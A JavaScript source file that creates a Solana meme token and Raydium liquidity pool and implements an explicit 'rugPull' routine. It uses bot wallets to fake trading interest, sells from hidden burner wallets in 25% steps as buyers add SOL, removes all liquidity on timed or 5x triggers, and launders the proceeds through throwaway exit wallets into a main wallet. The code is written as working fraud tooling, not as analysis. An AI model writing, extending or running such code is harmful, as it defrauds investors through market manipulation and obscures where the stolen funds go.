import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID, createMint, mintTo, getOrCreateAssociatedTokenAccount, setAuthority, AuthorityType, getMint, transfer } from "@solana/spl-token";
import { createCreateMetadataAccountV3Instruction, TOKEN_METADATA_PROGRAM_ID } from "@metaplex-foundation/mpl-token-metadata";
import { Liquidity, MAINNET_PROGRAM_ID, Token, TokenAmount, Percent } from "@raydium-io/raydium-sdk";
import { config } from "./config.js";
import fetch from "node-fetch";
import FormData from "form-data";
import fs from "fs";

const connection = new Connection(config.rpcEndpoint, "confirmed");
const SOL_MINT = new PublicKey("So11111111111111111111111111111111111111112");

async function retryTransaction(tx, signers, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const sig = await connection.sendTransaction(tx, signers);
      await connection.confirmTransaction({
        signature: sig,
        blockhash: tx.recentBlockhash,
        lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight,
      });
      return sig;
    } catch (error) {
      if (i === retries - 1) throw error;
      console.warn(`Retry ${i + 1}/${retries} failed: ${error.message}. Retrying in 5s...`);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

async function uploadToPinata(imageBlob, coinName) {
  const form = new FormData();
  form.append("file", imageBlob, `${coinName}.png`);
  const response = await fetch("https://api.pinata.cloud/pinning/pinFileToIPFS", {
    method: "POST",
    headers: {
      "pinata_api_key": config.pinataApiKey,
      "pinata_secret_api_key": config.pinataSecretApiKey,
    },
    body: form,
  });
  const result = await response.json();
  return `https://gateway.pinata.cloud/ipfs/${result.IpfsHash}`;
}

export const createToken = async (answers, mainWallet, coinWallet, burners, coinName, coinIconUri) => {
  try {
    const balance = await connection.getBalance(mainWallet.publicKey);
    const burnerFunding = answers.useBurners ? answers.burnerCount * answers.burnerSol * LAMPORTS_PER_SOL : 0;
    const minSolRequired = answers.coinWalletSol * LAMPORTS_PER_SOL + (answers.addLiquidity ? answers.liquiditySol * LAMPORTS_PER_SOL : 0) + burnerFunding + 0.5 * LAMPORTS_PER_SOL;
    if (balance < minSolRequired) {
      throw new Error(`Insufficient balance: ${balance / LAMPORTS_PER_SOL} SOL < ${minSolRequired / LAMPORTS_PER_SOL} SOL required`);
    }

    const mint = await createMint(connection, coinWallet, coinWallet.publicKey, null, 6);
    console.log(`Token Mint Created: ${mint.toBase58()}`);

    const tokenAccounts = [];
    const supply = BigInt(Math.floor(1000000 * Math.pow(10, 6))); // Fixed 1M supply
    const burnerCount = answers.useBurners ? answers.burnerCount : 0;

    if (answers.useBurners && burners.length > 0) {
      const perBurnerSupply = supply / BigInt(burnerCount + 1);
      for (const burner of burners) {
        const burnerAccount = await getOrCreateAssociatedTokenAccount(connection, coinWallet, mint, burner.publicKey);
        await mintTo(connection, coinWallet, mint, burnerAccount.address, coinWallet.publicKey, perBurnerSupply);
        console.log(`Minted ${1000000 / (burnerCount + 1)} tokens to burner ${burnerAccount.address.toBase58()}`);
        tokenAccounts.push({ keypair: burner, account: burnerAccount.address });
      }
    }

    const coinAccount = await getOrCreateAssociatedTokenAccount(connection, coinWallet, mint, coinWallet.publicKey);
    const coinSupply = answers.useBurners ? supply / BigInt(burnerCount + 1) : supply;
    await mintTo(connection, coinWallet, mint, coinAccount.address, coinWallet.publicKey, coinSupply);
    console.log(`Minted ${answers.useBurners ? 1000000 / (burnerCount + 1) : 1000000} tokens to coin wallet ${coinAccount.address.toBase58()}`);
    tokenAccounts.push({ keypair: coinWallet, account: coinAccount.address });

    const [metadataPDA] = await PublicKey.findProgramAddress(
      [Buffer.from("metadata"), TOKEN_METADATA_PROGRAM_ID.toBuffer(), mint.toBuffer()],
      TOKEN_METADATA_PROGRAM_ID
    );
    const metadataTx = new Transaction().add(
      createCreateMetadataAccountV3Instruction(
        {
          metadata: metadataPDA,
          mint,
          mintAuthority: coinWallet.publicKey,
          payer: coinWallet.publicKey,
          updateAuthority: coinWallet.publicKey,
        },
        {
          createMetadataAccountArgsV3: {
            data: {
              name: coinName,
              symbol: coinName.slice(0, 4).toUpperCase(),
              uri: coinIconUri,
              sellerFeeBasisPoints: 500,
              creators: [{ address: coinWallet.publicKey, verified: true, share: 100 }],
              collection: null,
              uses: null,
            },
            isMutable: true,
            collectionDetails: null,
          },
        }
      )
    );
    await retryTransaction(metadataTx, [coinWallet]);
    console.log(`Metadata set with name ${coinName} and icon ${coinIconUri}`);

    let poolKeys = null;
    if (answers.addLiquidity) {
      poolKeys = await addLiquidity(coinWallet, mint, coinAccount, answers.liquiditySol, answers.liquidityTokens);
    }

    return { mint, tokenAccounts, poolKeys };
  } catch (error) {
    console.error("Token creation error:", error.message);
    throw error;
  }
};

export const addLiquidity = async (coinWallet, mint, coinAccount, solAmount, tokenAmount) => {
  try {
    const mintInfo = await getMint(connection, mint);
    const token = new Token(TOKEN_PROGRAM_ID, mint, mintInfo.decimals);
    const solToken = new Token(TOKEN_PROGRAM_ID, SOL_MINT, 9);
    const baseAmount = new TokenAmount(token, BigInt(Math.floor(tokenAmount * Math.pow(10, mintInfo.decimals))));
    const quoteAmount = new TokenAmount(solToken, BigInt(Math.floor(solAmount * LAMPORTS_PER_SOL)));

    const poolTx = await Liquidity.makeCreatePoolTransaction({
      connection,
      payer: coinWallet.publicKey,
      baseMint: mint,
      quoteMint: SOL_MINT,
      baseAmount,
      quoteAmount,
      marketId: null,
      programId: MAINNET_PROGRAM_ID.AmmV4,
    });

    const poolSig = await retryTransaction(poolTx.transaction, [coinWallet, ...poolTx.signers]);
    console.log(`Liquidity pool created: ${poolSig}`);

    return poolTx.poolKeys;
  } catch (error) {
    console.error("Error adding liquidity:", error.message);
    throw error;
  }
};

export const rugPull = async (mainWallet, coinWallet, burners, bots, poolKeys, initialSol, isAiTriggered) => {
  try {
    console.warn("Rug pull initiated (experimental feature)!");

    const preRugBalance = await connection.getBalance(coinWallet.publicKey) / LAMPORTS_PER_SOL;
    let sellCount = 0; // Track 25% sells (up to 3 for 75%)
    let shouldRug = false;

    // Bot network seeds pool growth
    for (const bot of bots) {
      const botTx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: bot.publicKey,
          toPubkey: poolKeys.quoteVault,
          lamports: BigInt(Math.floor(0.05 * LAMPORTS_PER_SOL)), // 0.05 SOL per bot
        })
      );
      await retryTransaction(botTx, [bot]);
      console.log(`Bot ${bot.publicKey.toBase58()} seeded pool with 0.05 SOL`);
    }

    // Continuous monitoring via WebSocket
    connection.onAccountChange(poolKeys.quoteVault, async (accountInfo) => {
      const currentSol = Number(accountInfo.lamports) / LAMPORTS_PER_SOL;
      console.log(`Pool SOL update: ${currentSol}`);

      if (currentSol >= initialSol * (1 + sellCount)) {
        sellCount++;
        if (sellCount <= 3) { // Up to 75%
          for (const burner of burners) {
            const burnerAccount = await getOrCreateAssociatedTokenAccount(connection, burner, poolKeys.baseMint, burner.publicKey);
            const tokenBalance = await connection.getTokenAccountBalance(burnerAccount.address);
            const sellAmount = BigInt(Math.floor(tokenBalance.value.amount * 0.25));
            if (sellAmount > 0) {
              const tx = new Transaction().add(
                transfer({
                  source: burnerAccount.address,
                  destination: poolKeys.baseVault,
                  owner: burner.publicKey,
                  amount: sellAmount,
                })
              );
              await retryTransaction(tx, [burner]);
              console.log(`Burner ${burner.publicKey.toBase58()} sold ${tokenBalance.value.uiAmount * 0.25} tokens (${sellCount * 25}%)`);
            }
          }
        }
      }

      if (!isAiTriggered && currentSol >= 5 * initialSol) {
        console.log("Non-AI: SOL ≥ 5x, triggering early rug pull");
        shouldRug = true;
      }
    }, "confirmed");

    // Determine rug pull timing
    let rugTimeSeconds;
    if (isAiTriggered) {
      const poolData = await Liquidity.fetchPoolData(connection, poolKeys.id);
      const finalSol = Number(poolData.quoteVault.amount) / LAMPORTS_PER_SOL;
      if (finalSol > 100 * initialSol) {
        rugTimeSeconds = 2 * 24 * 60 * 60; // 2 days
        console.log("AI-triggered: SOL > 100x, rugging in 2 days");
      } else if (finalSol > 10 * initialSol) {
        rugTimeSeconds = 24 * 60 * 60; // 1 day
        console.log("AI-triggered: SOL 10x-100x, rugging in 1 day");
      } else {
        rugTimeSeconds = 12 * 60 * 60; // 12 hours
        console.log("AI-triggered: SOL < 10x, rugging in 12 hours");
      }
      await new Promise(resolve => setTimeout(resolve, rugTimeSeconds * 1000));
    } else {
      const maxTimeSeconds = 4 * 60 * 60; // 4 hours
      for (let time = 0; time <= maxTimeSeconds; time += 10) {
        await new Promise(resolve => setTimeout(resolve, 10000)); // 10s intervals
        if (shouldRug || time >= maxTimeSeconds) {
          console.log(shouldRug ? "Non-AI: Early rug triggered" : "Non-AI: 4 hours reached, rugging now");
          break;
        }
      }
    }

    // Withdraw liquidity
    const coinLpAccount = await getOrCreateAssociatedTokenAccount(connection, coinWallet, poolKeys.lpMint, coinWallet.publicKey);
    const withdrawTx = await Liquidity.makeRemoveLiquidityTransaction({
      connection,
      payer: coinWallet.publicKey,
      poolKeys,
      amount: new Percent(100, 100),
      programId: MAINNET_PROGRAM_ID.AmmV4,
    });
    const withdrawSig = await retryTransaction(withdrawTx.transaction, [coinWallet, ...withdrawTx.signers]);
    console.log(`Coin wallet withdrew liquidity: ${withdrawSig}`);

    // Profit tracking
    const postRugBalance = await connection.getBalance(coinWallet.publicKey) / LAMPORTS_PER_SOL;
    const withdrawnSol = postRugBalance - preRugBalance;
    console.log(`Profit Tracking - Withdrawn SOL: ${withdrawnSol}, Leftovers: ${preRugBalance}, Total: ${postRugBalance}`);

    // Transfer to exit wallets
    const totalSol = postRugBalance;
    const { createExitWallets } = await import("./keypair.js");
    const exitWallets = await createExitWallets(coinWallet, totalSol);

    // Exit wallets transfer to Phantom
    for (const exitWallet of exitWallets) {
      const exitSolBalance = await connection.getBalance(exitWallet.publicKey);
      if (exitSolBalance > 5000) {
        const exitTx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: exitWallet.publicKey,
            toPubkey: mainWallet.publicKey,
            lamports: exitSolBalance - 5000,
          })
        );
        await retryTransaction(exitTx, [exitWallet]);
        console.log(`Exit wallet ${exitWallet.publicKey.toBase58()} transferred ${exitSolBalance / LAMPORTS_PER_SOL} SOL to Phantom wallet`);
      }
    }

    console.log("Rug pull completed: SOL consolidated back to Phantom wallet");
  } catch (error) {
    console.error("Error executing rug pull:", error.message);
    throw error;
  }
};
